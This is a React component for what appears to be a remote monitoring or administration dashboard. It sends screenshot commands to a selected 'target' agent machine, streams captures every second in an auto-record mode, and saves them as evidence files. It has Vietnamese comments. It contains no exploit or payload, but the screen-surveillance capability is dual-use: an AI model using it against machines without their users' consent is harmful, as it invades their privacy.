import React, { useState, useEffect, useRef } from 'react';
import { Camera, Download, Video, VideoOff, Loader2, Scan } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';
import { CyberCard, CyberButton } from './CyberUI';

export default function ScreenshotCard() {
    const [screenshot, setScreenshot] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const recordingInterval = useRef<NodeJS.Timeout | null>(null);
    const { socket, isConnected, selectedAgentId } = useSocket();

    // 1. Nhận ảnh từ Server (Sự kiện "ReceiveScreenshot")
    useEffect(() => {
        if (!socket) return;

        const handleReceiveImage = (base64String: string) => {
            setScreenshot(`data:image/png;base64,${base64String}`);
            setLoading(false);
        };

        const handleReceiveError = (errorMessage: string) => {
            setLoading(false);
            if (isRecording) stopRecording();
            else alert("LỖI: " + errorMessage);
        };

        socket.on("ReceiveScreenshot", handleReceiveImage);
        socket.on("ReceiveScreenshotError", handleReceiveError);

        return () => {
            socket.off("ReceiveScreenshot", handleReceiveImage);
            socket.off("ReceiveScreenshotError", handleReceiveError);
        };
    }, [socket, isRecording]);

    // 2. Chụp ảnh đơn
    const handleSnapshot = async () => {
        if (!isConnected || !selectedAgentId) return alert('⚠ CHƯA CHỌN MÁY MỤC TIÊU!');
        setLoading(true);
        try { await sendCommand('take_screenshot'); } 
        catch (error) { setLoading(false); }
    };

    // 3. Quay phim (Chụp liên tục mỗi 1s)
    const toggleRecording = () => isRecording ? stopRecording() : startRecording();

    const startRecording = () => {
        if (!selectedAgentId) return alert("⚠ CHƯA CHỌN MÁY!");
        setIsRecording(true);
        handleSnapshot(); // Chụp ngay
        recordingInterval.current = setInterval(() => handleSnapshot(), 1000);
    };

    const stopRecording = () => {
        setIsRecording(false);
        if (recordingInterval.current) clearInterval(recordingInterval.current);
    };

    useEffect(() => () => stopRecording(), []);

    const handleDownload = () => {
        if (screenshot) {
            const link = document.createElement('a');
            link.href = screenshot;
            link.download = `EVIDENCE_${Date.now()}.png`;
            link.click();
        }
    };

    return (
        <CyberCard title="SURVEILLANCE_FEED // SCREENSHOT" className="h-full flex flex-col">
            <div className="flex justify-between items-center mb-2 px-2 text-[10px] font-mono border-b border-gray-800 pb-2">
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isRecording ? 'bg-cyber-red animate-pulse' : 'bg-cyber-blue'}`}></div>
                    <span className={isRecording ? 'text-cyber-red font-bold' : 'text-cyber-blue'}>
                        {isRecording ? 'REC ● LIVE' : 'STANDBY'}
                    </span>
                </div>
            </div>

            <div className="relative flex-1 bg-black border border-gray-800 min-h-[250px] overflow-hidden flex items-center justify-center">
                {screenshot ? (
                    <img src={screenshot} className="w-full h-full object-contain" alt="Screenshot" />
                ) : (
                    <div className="text-center opacity-50">
                        {loading ? <Loader2 className="w-10 h-10 text-cyber-yellow animate-spin" /> : <Scan className="w-16 h-16 text-gray-600" />}
                        <p className="text-xs text-gray-500 mt-2">NO VISUAL DATA</p>
                    </div>
                )}
            </div>

            <div className="grid grid-cols-12 gap-2 mt-4">
                <div className="col-span-5"><CyberButton onClick={handleSnapshot} disabled={loading || isRecording} className="w-full py-2 text-xs"><Camera className="w-4 h-4 mr-1" /> SNAPSHOT</CyberButton></div>
                <div className="col-span-5"><CyberButton onClick={toggleRecording} variant={isRecording ? "danger" : "secondary"} className="w-full py-2 text-xs">{isRecording ? <><VideoOff className="w-4 h-4 mr-1" /> STOP</> : <><Video className="w-4 h-4 mr-1" /> AUTO-REC</>}</CyberButton></div>
                <div className="col-span-2"><CyberButton onClick={handleDownload} disabled={!screenshot} variant="ghost" className="w-full py-2 flex justify-center"><Download className="w-4 h-4" /></CyberButton></div>
            </div>
        </CyberCard>
    );
}